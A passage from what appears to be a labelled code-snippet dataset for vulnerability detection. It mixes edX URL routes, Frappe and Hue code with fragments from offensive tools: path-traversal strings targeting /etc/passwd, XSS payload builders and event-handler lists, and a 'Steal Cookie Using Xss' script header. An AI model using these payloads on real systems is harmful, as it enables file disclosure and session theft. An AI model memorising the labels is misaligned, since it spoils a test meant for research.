'courseware.module_render.modx_dispatch', name='modx_dispatch'), url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"), url(r'^courses", "label": 0}, {"snippet_id": 10675, "code": "-C testsonly -assume servers are running(as per above) and run tests with no setup or cleaning of environment test_spec -when set, specifies test files, classes, cases, etc. See platform doc. default_store", "label": 0}, {"snippet_id": 2434, "code": "='../Payloads/xss.txt' else: path='Payloads/xss.txt' with open(path) as f: for line in f: if line: payload_list.append(line.rstrip()) return payload_list def check_xss_impact(res_headers): print \"response", "label": 0}, {"snippet_id": 29866, "code": " None: \ttry: \t\tfunct.ssh_command(serv,[\"ls -1t\"]) \texcept: \t\tprint('<div class=\"alert alert-danger\" style=\"margin:0\">Can not connect to the server</div>') \t\t if form.getvalue('getcert') is not None and", "label": 0}, {"snippet_id": 26525, "code": "%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '../../etc", "label": 0}, {"snippet_id": 53642, "code": ").deploy() deployment_mapping['wf_%s_dir' % i]=request.fs.get_hdfs_path(wf_dir) coordinator=Coordinator(document=coord) coord_dir=Submission(request.user, coordinator, request.fs, request.jt, properties", "label": 0}, {"snippet_id": 24875, "code": " self.serversonly: return \"\" cmd=[ \"DEFAULT_STORE={}\".format(self.default_store), \"SCREENSHOT_DIR='{}'\".format(self.log_dir), \"BOK_CHOY_HAR_DIR='{}'\".format(self.har_dir), \"BOKCHOY_A11Y_CUSTOM_RULES_FILE='", "label": 0}, {"snippet_id": 8769, "code": "'static_template_view.views.render', {'template': '404.html'}, name=\"404\"), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^jobs$', 'static_template_view.views.render', {'template': 'jobs.html'", "label": 0}, {"snippet_id": 37002, "code": "\"Blog Category\",{\"name\": route}, \"title\") or route def get_blog_list(doctype, txt=None, filters=None, limit_start=0, limit_page_length=20, order_by=None): \tconditions=[] \tif filters: \t\tif filters.blogger", "label": 0}, {"snippet_id": 45642, "code": " uuid=bundle_data['uuid'], type='oozie-bundle2', owner=request.user) Document.objects.link(bundle_doc, owner=bundle_doc.owner, name=bundle_doc.name, description=bundle_doc.description, extra='bundle2') if", "label": 0}, {"snippet_id": 41859, "code": " not in self.ignore_in_getter \\ \t\t\t\tand key in(d.fieldname for d in self.meta.get_table_fields()): \t\t\t\tself.set(key,[]) \t\t\t\tvalue=self.__dict__.get(key) \t\t\treturn value \t\telse: \t\t\treturn self.__dict__ ", "label": 0}, {"snippet_id": 15742, "code": " the nosetests command to send to the terminal. If nosetests aren't being run, the command returns an empty string. \"\"\" if not self.test_spec: test_spec=self.test_dir else: test_spec=self.test_dir / self", "label": 0}, {"snippet_id": 35153, "code": " fieldname))) \t\t \t\traise frappe.UniqueValidationError(self.doctype, self.name, e) \tdef update_modified(self): \t\t'''Update modified timestamp''' \t\tself.set(\"modified\", now()) \t\tfrappe.db.set_value(self.doctype", "label": 0}, {"snippet_id": 8201, "code": ": urlpatterns +=( url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'), ) if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'): urlpatterns +=( url(r'^course_specific_login", "label": 0}, {"snippet_id": 39873, "code": "\telif(df.fieldname !=\"amended_from\" \t\t\t\t\t\tand(is_submittable or self.meta.is_submittable) and frappe.get_meta(doctype).is_submittable \t\t\t\t\t\tand cint(frappe.db.get_value(doctype, docname, \"docstatus\"))=", "label": 0}, {"snippet_id": 43714, "code": "): \t\t\"\"\"Returns true if fieldname is to be hidden for print. \t\tPrint Hide can be set via the Print Format Builder or in the controller as a list \t\tof hidden fields. Example \t\t\tclass MyDoc(Document): \t\t", "label": 0}, {"snippet_id": 9152, "code": "[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index', name=\"pdf_book\")", "label": 1}, {"snippet_id": 38056, "code": ", \"route\": \"/blog\"}, \t\t\t{\"label\": context.category.title, \"route\":context.category.route}] def get_list_context(context=None): \tlist_context=frappe._dict( \t\ttemplate=\"templates/includes/blog/blog.html\"", "label": 0}, {"snippet_id": 22131, "code": ".static import static from. import one_time_startup import django.contrib.auth.views if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): admin.autodiscover() urlpatterns=('', url", "label": 0}, {"snippet_id": 38016, "code": "\tif not context.comment_list: \t\t\tcontext.comment_text=_('No comments yet') \t\telse: \t\t\tif(len(context.comment_list))==1: \t\t\t\tcontext.comment_text=_('1 comment') \t\t\telse: \t\t\t\tcontext.comment_text=_('{0} comments", "label": 0}, {"snippet_id": 5968, "code": ".abspath(os.path.dirname(__file__)) README=open(os.path.join(here, 'README')).read() version='0.3.22' install_requires=[ 'pymongo>=2.8,<3', 'pysaml2==1.2.0beta5', 'python-memcached==1.53', 'cherrypy==3.2.4',", "label": 1}, {"snippet_id": 4701, "code": "'oncopy', 'oncut', 'ondblclick', 'ondrag', 'ondragend', 'ondragenter', 'ondragleave', 'ondragover', 'ondragstart', 'ondrop', 'ondurationchange', 'onend', 'onemptied', 'onended', 'onerror', 'onfocus', 'onfocusin", "label": 0}, {"snippet_id": 52649, "code": "=0 response['parameters']=list(parameters) except Exception, e: response['message']=str(e) return HttpResponse(json.dumps(response), mimetype=\"application/json\") @check_document_access_permission() def", "label": 0}, {"snippet_id": 1806, "code": "='../Payloads/xss.txt' else: path='Payloads/xss.txt' with open(path) as f: for line in f: if line: payload_list.append(line.rstrip()) return payload_list def check_xss_impact(res_headers): print \"response", "label": 0}, {"snippet_id": 37868, "code": "\treturn frappe.db.get_value('Blog Category', self.blog_category, \t\t\t\t'route') +'/' +self.scrub(self.title) \tdef get_feed(self): \t\treturn self.title \tdef validate(self): \t\tsuper(BlogPost, self).validate()", "label": 0}, {"snippet_id": 51653, "code": ".environ.get('DJANGO_DATABASE', 'dev') DATABASES={'default': DATABASES_SETTINGS[DATABASE]} AUTH_PASSWORD_VALIDATORS=[ { 'NAME': 'django.contrib.auth.password_validation.UserAttributeSimilarityValidator", "label": 0}, {"snippet_id": 36982, "code": ".db.sql_list(\"\"\"select route from \t\t`tabBlog Post` where ifnull(published,0)=1\"\"\"): \t\tclear_cache(blog) \tclear_cache(\"writers\") def get_blog_category(route): \treturn frappe.db.get_value(\"Blog Category\",{", "label": 0}, {"snippet_id": 8083, "code": ".MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$', 'courseware.views.news', name=\"news\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/", "label": 0}, {"snippet_id": 24195, "code": " def test_get_test_course(self): suite=Pa11yCrawler('') suite.get_test_course() self._mock_sh.assert_has_calls([ call( 'wget{targz} -O{dir}demo_course.tar.gz'.format(targz=suite.tar_gz_file, dir=suite.imports_dir", "label": 0}, {"snippet_id": 18999, "code": ".view_tracking_log'), url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'), ) if settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'): urlpatterns +=( url(r'^status/', include('service_status.urls')), )", "label": 0}, {"snippet_id": 12176, "code": "*)$', 'staticbook.views.index_shifted'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^", "label": 1}, {"snippet_id": 1396, "code": " data['impact'], 'name': data['alert'], 'req_headers': data['req_headers'], 'req_body': data['req_body'], 'res_headers': data['res_headers'], 'res_body': data['res_body'], 'Description': vul['Description'", "label": 0}, {"snippet_id": 51329, "code": ") encrypted=f.encrypt(obj.internet_nl_api_password.encode()) obj.internet_nl_api_password=encrypted super().save_model(request, obj, form, change) actions=[] @admin.register(UrlList) class UrlListAdmin", "label": 0}, {"snippet_id": 4796, "code": " ] _htmlTemplate=''' <!DOCTYPE html> <html> <head> <title>XSS Fuzzer</title> <meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /> </head> <body> %s </body> </html> ''' _probes=[ \"\"\"'';", "label": 0}, {"snippet_id": 2450, "code": "()) return payload_list def check_xss_impact(res_headers): print \"response header\",res_headers['Content-Type'] if res_headers['Content-Type']: if res_headers['Content-Type'].find('application/json') !=", "label": 0}, {"snippet_id": 3590, "code": "\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) result,db_update=True,True vul_param +=key else", "label": 0}, {"snippet_id": 51090, "code": ": return obj.last_run_at @staticmethod def runs(obj): return obj.total_run_count @staticmethod def due(obj): if obj.last_run_at: return obj.schedule.remaining_estimate(last_run_at=obj.last_run_at) else", "label": 0}, {"snippet_id": 19158, "code": "\" \"SELENIUM_DRIVER_LOG_DIR='{repo_dir}/test_root/log{shard_str}' \" \"VERIFY_XSS='{verify_xss}' \" \"nosetests{repo_dir}/common/test/acceptance/{exp_text} \" \"--with-xunit \" \"--xunit-file={repo_dir}/reports", "label": 0}, {"snippet_id": 50274, "code": "(), request.getHost().port) sess=AjaxWebClientSession() sess.client=self sess.init_session(\"ajax/comet\", remote_addr, self.sessionhandler) sess.csessid=csessid csession=_CLIENT_SESSIONS(session_key=sess", "label": 0}, {"snippet_id": 36029, "code": " in self.flags.ignore_save_passwords: continue \t\t\tnew_password=self.get(df.fieldname) \t\t\tif new_password and not self.is_dummy_password(new_password): \t\t\t\t \t\t\t\tset_encrypted_password(self.doctype, self", "label": 0}, {"snippet_id": 40760, "code": "\tif self.get('parent_doc'): \t\t\t\t\tself.parent_doc.get_latest() \t\t\t\t\tref_doc=[d for d in self.parent_doc.get(self.parentfield) if d.name==self.name][0] \t\t\t\telse: \t\t\t\t\tref_doc=self.get_latest() \t\t\tfor df in", "label": 0}, {"snippet_id": 15764, "code": "[ \"DEFAULT_STORE={}\".format(self.default_store), \"SCREENSHOT_DIR='{}'\".format(self.log_dir), \"BOK_CHOY_HAR_DIR='{}'\".format(self.har_dir), \"BOKCHOY_A11Y_CUSTOM_RULES_FILE='{}'\".format(self.a11y_file), ", "label": 0}, {"snippet_id": 9940, "code": "'ENABLE_DEBUG_RUN_PYTHON'): urlpatterns +=( url(r'^debug/run_python', 'debug.views.run_python'), ) if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+", "label": 0}, {"snippet_id": 19260, "code": " name='tests/{}'.format(spec) self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_testcase_spec(self): spec='test_foo.py:FooTest.test_bar' suite=BokChoyTestSuite('', test_spec=spec)", "label": 0}, {"snippet_id": 5385, "code": "'onanimationend', 'onanimationiteration', 'onanimationstart', 'onbeforecopy', 'onbeforecut', 'onbeforeload', 'onbeforepaste', 'onbeforescriptexecute', 'onbeforeunload', 'onbegin', 'onblur', 'oncanplay', ", "label": 0}, {"snippet_id": 7439, "code": " name=\"jump_to\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.modx_dispatch', name='modx_dispatch'), url(r'^software-licenses$", "label": 0}, {"snippet_id": 54053, "code": "/%Y %H:%M:%S\"))) crl=[target.get()] if crawl.get()=='On': crl+=bane.crawl(target.get(),bypass=True) pr=proxy.get() if len(pr)==0: pr=None if method.get()==\"GET\": get=True post=False elif method.get()==", "label": 0}, {"snippet_id": 26524, "code": "%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', ", "label": 0}, {"snippet_id": 18413, "code": "*)/(?P<position>[^/]*)/?$', 'courseware.views.index', name=\"courseware_position\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$', 'courseware.views.progress', name=\"progress\"), url(r'^courses", "label": 0}, {"snippet_id": 16175, "code": "(r'^create_account$', 'student.views.create_account'), url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=\"activate\"), url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/", "label": 0}, {"snippet_id": 15544, "code": "\" ] else: substring=[ \"--with-xunit\", \"--xunit-file={}\".format(self.xunit_report), \"--verbosity={}\".format(self.verbosity), ] return \" \".join(substring) def prepare_bokchoy_run(self): \"\"\" Sets up and starts", "label": 0}, {"snippet_id": 40006, "code": "\"fields\",{\"set_only_once\":('=',1)})] \t\tif constants: \t\t\tvalues=frappe.db.get_value(self.doctype, self.name, constants, as_dict=True) \t\tfor fieldname in constants: \t\t\tdf=self.meta.get_field(fieldname) \t\t", "label": 0}, {"snippet_id": 30535, "code": ".getvalue('minut') \thour1=form.getvalue('hour1') \tminut1=form.getvalue('minut1') \tdate=hour+':'+minut \tdate1=hour1+':'+minut1 \tapache_log_path=sql.get_setting('apache_log_path') \t \tif grep is not None: \t", "label": 0}, {"snippet_id": 20913, "code": "=\"404\"), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^jobs$', 'static_template_view.views.render', {'template': 'jobs.html'}, name=\"jobs\"), url(r'^press$', 'student.views", "label": 0}, {"snippet_id": 14219, "code": "]*)/(?P<location>.*?)$', 'courseware.views.submission_history', name='submission_history'), ) if settings.ENABLE_JASMINE: urlpatterns +=(url(r'^_jasmine/', include('django_jasmine.urls')),) if settings", "label": 0}, {"snippet_id": 34031, "code": "\tposts=frappe.db.sql(query, as_dict=1) \tfor post in posts: \t\tpost.cover_image=find_first_image(post.content) \t\tpost.published=global_date_format(post.creation) \t\tpost.content=strip_html_tags(post.content", "label": 0}, {"snippet_id": 37729, "code": " `tabBlogger` t2 \t\twhere ifnull(t1.published,0)=1 \t\tand t1.blogger=t2.name \t\t%(condition)s \t\torder by published_on desc, name asc \t\tlimit %(start)s, %(page_len)s\"\"\" %{ \t\t\t\"start\": limit_start, \"page_len", "label": 0}, {"snippet_id": 14720, "code": "'', test_spec=spec) name='tests/{}'.format(spec) self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_spec_with_draft_default_store(self): spec='test_foo.py' suite=BokChoyTestSuite('", "label": 0}, {"snippet_id": 44158, "code": " domain_hits=inner_hits['domains']['hits']['hits'] assert len(domain_hits)==0 section_hits=inner_hits['sections']['hits']['hits'] assert len(section_hits)==1 section_content_highlight=section_hits[0]['highlight", "label": 0}, {"snippet_id": 52329, "code": "\"application/json\") @check_document_modify_permission() def save_workflow(request): response={'status': -1} workflow=json.loads(request.POST.get('workflow', '{}')) layout=json.loads(request.POST.get('layout',", "label": 0}, {"snippet_id": 4232, "code": ".headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) result,db_update=True,True vul_param +=key else: result=True if vul_param=='': vul_param +=key else: vul_param +=','+key except", "label": 0}, {"snippet_id": 24277, "code": " as test_utils import os try: from pygments.console import colorize except ImportError: colorize=lambda color, text: text __test__=False DEFAULT_NUM_PROCESSES=1 DEFAULT_VERBOSITY=2 class BokChoyTestSuite", "label": 0}, {"snippet_id": 21070, "code": "(r'^notify/', include(notify_pattern())), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$', 'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"), url(r'^courses/(?:[^/]+/[^/]+/[^", "label": 0}, {"snippet_id": 36153, "code": "._precision[cache_key]: \t\t\tself._precision[cache_key][fieldname]=None \t\t\tdoctype=self.meta.get_field(parentfield).options if parentfield else self.doctype \t\t\tdf=frappe.get_meta(doctype).get_field(fieldname) \t", "label": 0}, {"snippet_id": 48972, "code": " value): if isinstance(value, datetime.datetime) or isinstance(value, datetime.date): return localize(value) return value def render(self): return format_html( '<td>{}</td>', self.format(self.get_value", "label": 0}, {"snippet_id": 15289, "code": " def __init__(self, *args, **kwargs): super(BokChoyTestSuite, self).__init__(*args, **kwargs) self.test_dir=Env.BOK_CHOY_DIR / kwargs.get('test_dir', 'tests') self.log_dir=Env.BOK_CHOY_LOG_DIR self.report_dir", "label": 0}, {"snippet_id": 38783, "code": "=1)[0] \tdef set(self, key, value, as_value=False): \t\tif isinstance(value, list) and not as_value: \t\t\tself.__dict__[key]=[] \t\t\tself.extend(key, value) \t\telse: \t\t\tself.__dict__[key]=value \tdef delete_key", "label": 0}, {"snippet_id": 37430, "code": "\"), \"route\":\"/\"}, \t\t\t{\"name\": \"Blog\", \"route\": \"/blog\"}, \t\t\t{\"label\": context.category.title, \"route\":context.category.route}] def get_list_context(context=None): \tlist_context=frappe._dict( \t\ttemplate", "label": 0}, {"snippet_id": 23321, "code": "\"), ) if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$', 'courseware", "label": 0}, {"snippet_id": 41792, "code": ".dont_update_if_missing): \t\t\t\tself.set(key, value) \tdef get_db_value(self, key): \t\treturn frappe.db.get_value(self.doctype, self.name, key) \tdef get(self, key=None, filters=None, limit=None, default=None): \t\tif", "label": 0}, {"snippet_id": 28976, "code": "(log_path +\"/config_edit-\"+get_data('logs')+\".log\", \"a\") \t\tlog.write(diff) \t\tlog.close \texcept IOError: \t\tprint('<center><div class=\"alert alert-danger\">Can\\'t read write change to log. %s</div></center>", "label": 0}, {"snippet_id": 15793, "code": ".verbosity_processes_string()) ] if self.pdb: cmd.append(\"--pdb\") if self.save_screenshots: cmd.append(\"--with-save-baseline\") cmd.append(self.extra_args) cmd=(\" \").join(cmd) return cmd class Pa11yCrawler(BokChoyTestSuite): \"\"\"", "label": 0}, {"snippet_id": 26357, "code": " therefore ' 'need to charge VAT on your invoice. You can get the tax amount ' 'back via the VAT reimbursement process.')) except vat_moss.errors.WebServiceError: logger.exception('VAT ID checking failed", "label": 0}, {"snippet_id": 24373, "code": "-number of processes or threads to use in tests. Recommendation is that this is less than or equal to the number of available processors. verify_xss -when set, check for XSS vulnerabilities in the page HTML.", "label": 0}, {"snippet_id": 48765, "code": ") if(aid.RID.createdByUser==u or u.rights > 1) and aid.RID==r and not r.submitted: aid.delete() else: return HttpResponseRedirect(\"/admin?error=You're%20not%20allowed%20to%20do%20this\") return response", "label": 0}, {"snippet_id": 18454, "code": "/instructor$', 'instructor.views.instructor_dashboard', name=\"instructor_dashboard\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$', 'instructor.views.gradebook', name='gradebook'), url(r'^courses/", "label": 0}, {"snippet_id": 4316, "code": "%s'></img>\" % self.url return payload def script(self): payload=\"<script src='%s'></script>\" % self.url return payload def event(self, element, src, event, js): payload=\"<%s src=\" % element payload +='", "label": 1}, {"snippet_id": 9929, "code": "=( url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=\"foldit_ops\"), ) if settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'): urlpatterns +=( url(r'^debug/run_python', 'debug.views.run_python'", "label": 0}, {"snippet_id": 1931, "code": "\"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) db_update=True vul_param +=key else: result=True if vul_param=='", "label": 0}, {"snippet_id": 10716, "code": " processors. verify_xss -when set, check for XSS vulnerabilities in the page HTML. See nosetest documentation: http://nose.readthedocs.org/en/latest/usage.html \"\"\" def __init__(self, *args, **kwargs): super", "label": 0}, {"snippet_id": 25707, "code": "=help_text, initial=initialbool, widget=widget, ) elif q.type==Question.TYPE_NUMBER: field=forms.DecimalField( label=q.question, required=q.required, help_text=q.help_text, initial=initial.answer if initial", "label": 0}, {"snippet_id": 48582, "code": ": sr=SubReservation() else: sr=SubReservation.objects.get(id=srid) if request.POST.get(\"notes\"): sr.notes=request.POST[\"notes\"] else: sr.notes=\" \" sr.primary_reservation=GroupReservation.objects.get(id", "label": 1}, {"snippet_id": 45686, "code": "(request.user) bundle_doc.dependencies=dependencies bundle_doc.update_data(bundle_data) bundle_doc.name=bundle_data['name'] bundle_doc.save() response['status']=0 response['id']=bundle_doc.id response[", "label": 0}, {"snippet_id": 4710, "code": "'ondrop', 'ondurationchange', 'onend', 'onemptied', 'onended', 'onerror', 'onfocus', 'onfocusin', 'onfocusout', 'onhashchange', 'oninput', 'oninvalid', 'onkeydown', 'onkeypress', 'onkeyup', 'onload', 'onloadeddata", "label": 0}, {"snippet_id": 977, "code": ": url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result)", "label": 1}, {"snippet_id": 20294, "code": "(self): \"\"\" This method composes the nosetests command to send to the terminal. If nosetests aren't being run, the command returns an empty string. \"\"\" if not self.test_spec: test_spec=self.test_dir else", "label": 0}, {"snippet_id": 31555, "code": "(i[1]) \t\tdf=pd.DataFrame.from_dict(metrics, orient=\"index\") \t\tdf=df.fillna(0) \t\tdf.index=pd.to_datetime(df.index) \t\tdf.index.name='Date' \t\tdf.sort_index(inplace=True) \t\tsource=ColumnDataSource(df) \t\t \t", "label": 0}, {"snippet_id": 9805, "code": "/$', 'external_auth.views.provider_identity', name='openid-provider-identity'), url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds') ) if settings.MITX_FEATURES", "label": 0}, {"snippet_id": 46492, "code": "', False)}) def admin_collections(request, is_redirect=False, is_mobile=False): existing_hue_collections=DashboardController(request.user).get_search_collections() if request.GET.get('format')=='json':", "label": 0}, {"snippet_id": 50368, "code": " request(Request): Incoming request. \"\"\" csessid=request.args.get('csessid')[0] self.last_alive[csessid]=(time.time(), False) sess=self.sessionhandler.sessions_from_csessid(csessid) if sess: sess=sess[0", "label": 0}, {"snippet_id": 50300, "code": "\"webclient_authenticated_uid\", False) if uid: sess.uid=uid sess.logged_in=True sess.sessionhandler.connect(sess) self.last_alive[csessid]=(time.time(), False) if not self.keep_alive: self.keep_alive=LoopingCall(self._keepalive)", "label": 0}, {"snippet_id": 25940, "code": "%s' % q.id]=field responses=question_form_fields.send(sender=event, position=pos) data=pos.meta_info_data for r, response in sorted(responses, key=lambda r: str(r[0])): for key, value in response.items", "label": 0}, {"snippet_id": 52591, "code": "'node', '{}')) parameters=parameters.union(set(Node(node_data).find_parameters())) script_path=node_data.get('properties',{}).get('script_path',{}) if script_path: script_path=script_path.replace('hdfs://'", "label": 0}, {"snippet_id": 27673, "code": "() values['is_development']=( environment.is_running_on_app_engine_development()) values['is_logged_in']=bool(helpers.get_user_email()) values['ga_tracking_id']=( local_config.GAEConfig().get('ga_tracking_id", "label": 0}, {"snippet_id": 24475, "code": "=kwargs.get('extra_args', '') self.har_dir=self.log_dir / 'hars' self.a11y_file=Env.BOK_CHOY_A11Y_CUSTOM_RULES_FILE self.imports_dir=kwargs.get('imports_dir', None) self.coveragerc=kwargs.get('coveragerc'", "label": 0}, {"snippet_id": 8600, "code": " 'student.views.activate_account', name=\"activate\"), url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=\"begin_exam_registration\"), url(r'^create_exam_registration$", "label": 0}, {"snippet_id": 18277, "code": "[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>", "label": 1}, {"snippet_id": 12745, "code": "'), url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'), ) if settings.MITX_FEATURES.get('AUTH_USE_SHIB'): urlpatterns +=( url(r'^shib-login/$', 'external_auth.views.shib_login", "label": 0}, {"snippet_id": 34144, "code": ".password import get_decrypted_password, set_encrypted_password _classes={} def get_controller(doctype): \t\"\"\"Returns the **class** object of the given DocType. \tFor `custom` type, returns `frappe.model", "label": 0}, {"snippet_id": 22251, "code": "', 'student.views.login_user'), url(r'^logout$', 'student.views.logout_user', name='logout'), url(r'^create_account$', 'student.views.create_account', name='create_account'), url(r'^activate/(?P<key>[^", "label": 0}, {"snippet_id": 5425, "code": "'onkeyup', 'onload', 'onloadeddata', 'onloadedmetadata', 'onloadstart', 'onmessage', 'onmousedown', 'onmouseenter', 'onmouseleave', 'onmousemove', 'onmouseout', 'onmouseover', 'onmouseup', 'onmousewheel', ", "label": 0}, {"snippet_id": 48816, "code": " self.label: return self.label elif self.model_field: return self.model_field.verbose_name.title() elif self.field_name=='__str__': return self.model._meta.verbose_name.title() try: field=getattr(self.model", "label": 0}, {"snippet_id": 39730, "code": " \t\t\t\t\tdoctype=df.options \t\t\t\t\tif not doctype: \t\t\t\t\t\tfrappe.throw(_(\"Options not set for link field{0}\").format(df.fieldname)) \t\t\t\telse: \t\t\t\t\tdoctype=self.get(df.options) \t\t\t\t\tif not doctype: \t\t\t\t\t\tfrappe", "label": 0}, {"snippet_id": 18648, "code": "\"remove_from_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$', 'course_groups.views.debug_cohort_mgmt', name=\"debug_cohort_mgmt\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)", "label": 0}, {"snippet_id": 16225, "code": "<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$', 'student.views.password_reset_confirm_wrapper', name='auth_password_reset_confirm'), url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete", "label": 0}, {"snippet_id": 42435, "code": " \t\ttry: \t\t\tfrappe.db.sql(\"\"\"insert into `tab{doctype}` \t\t\t\t({columns}) values({values})\"\"\".format( \t\t\t\t\tdoctype=self.doctype, \t\t\t\t\tcolumns=\", \".join([\"`\"+c+\"`\" for c in columns]), \t\t\t\t\tvalues=\", \".join", "label": 0}, {"snippet_id": 5177, "code": "/src=x>' % payload def svg(self, payload): return '<svg/onload=\"%s\"/>' % payload def style(self, payload): return '<style/onload=\"%s\"></style>' % payload def input(self, payload): return '<input/onfocus=", "label": 0}, {"snippet_id": 50266, "code": ".getClientIP() host_string=\"%s(%s:%s)\" %(_SERVERNAME, request.getRequestHostname(), request.getHost().port) sess=AjaxWebClientSession() sess.client=self sess.init_session(\"ajax/comet\", remote_addr, self", "label": 0}, {"snippet_id": 53889, "code": " Flask,request from termcolor import colored from time import sleep print('\\n\\t[ Steal Cookie Using Xss..]\\n\\n') print(colored('\\n\\n[*] ','yellow')+'Coded By: Khaled Nassar @knassar702\\n\\n') sleep(2) app", "label": 1}, {"snippet_id": 20860, "code": "/RiceX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'RiceX'}), url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile', name", "label": 0}, {"snippet_id": 47011, "code": "), Q(target_kind=K_COMMENT)) return[item.target_id for item in queryset] @comment_reacted.connect async def update_comment_list_cache(_, user_id, comment_id): comment=await Comment.cache(comment_id) if", "label": 0}, {"snippet_id": 34902, "code": ", \"_liked_by\", \"__run_link_triggers\"): \t\t\tif self.get(key): \t\t\t\tdoc[key]=self.get(key) \t\treturn doc \tdef as_json(self): \t\treturn frappe.as_json(self.as_dict()) \tdef get_table_field_doctype(self, fieldname", "label": 0}, {"snippet_id": 19286, "code": ".assertEqual(suite.cmd, self._expected_command(name=name)) def test_spec_with_draft_default_store(self): spec='test_foo.py' suite=BokChoyTestSuite('', test_spec=spec, default_store='draft') name='tests/{}'.format", "label": 0}, {"snippet_id": 16896, "code": " url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$', 'courseware.views.progress', name=\"progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$', 'courseware", "label": 0}, {"snippet_id": 1847, "code": "'text/plain') !=-1: impact=\"Low\" else: impact=\"High\" else: impact=\"Low\" return impact def xss_payload_decode(payload): decoded_payload=urllib.unquote(payload).decode('utf8').encode('ascii','ignore') return", "label": 0}, {"snippet_id": 53436, "code": "=bundle_data['name'], uuid=bundle_data['uuid'], type='oozie-bundle2', owner=request.user) Document.objects.link(bundle_doc, owner=bundle_doc.owner, name=bundle_doc.name, description=bundle_doc.description", "label": 0}, {"snippet_id": 28273, "code": ".upload_and_restart(master[0], cfg, just_save=save) \t\t \tstderr=funct.upload_and_restart(serv, cfg, just_save=save) \t\t \tfunct.diff_config(oldcfg, cfg) \t \t \t \t \t \t\t \tos.system(\"/bin/rm -f \" +hap_configs_dir +\"*", "label": 0}, {"snippet_id": 42593, "code": "=self.meta.get_field(fieldname) \t\tif df: \t\t\tlabel=df.label \t\tfrappe.msgprint(_(\"{0} must be unique\".format(label or fieldname))) \t\t \t\traise frappe.UniqueValidationError(self.doctype, self.name, e) \tdef", "label": 0}, {"snippet_id": 20864, "code": "=\"static_university_profile\", kwargs={'org_id': 'RiceX'}), 